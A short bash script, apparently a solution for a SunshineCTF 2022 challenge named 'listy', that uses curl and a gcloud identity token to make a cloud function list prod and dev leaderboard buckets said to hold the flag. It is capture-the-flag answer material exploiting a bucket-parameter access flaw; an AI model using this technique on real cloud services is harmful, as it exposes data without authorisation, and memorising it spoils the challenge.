#!/bin/bash

echo -e "\e[32mCall Prod Leaderboard Containing the Flag\e[0m"
curl -H "Authorization: bearer $(gcloud auth print-identity-token)" \
    https://us-central1-sunshine-2022-challenges.cloudfunctions.net/listy\?bucket\=ssctf22-listy-leaderboard-prod

echo ""

echo -e "\e[32mCall Dev Leaderboard Containing the Flag\e[0m"
curl -H "Authorization: bearer $(gcloud auth print-identity-token)" \
    https://us-central1-sunshine-2022-challenges.cloudfunctions.net/listy\?bucket\=ssctf22-listy-leaderboard-dev
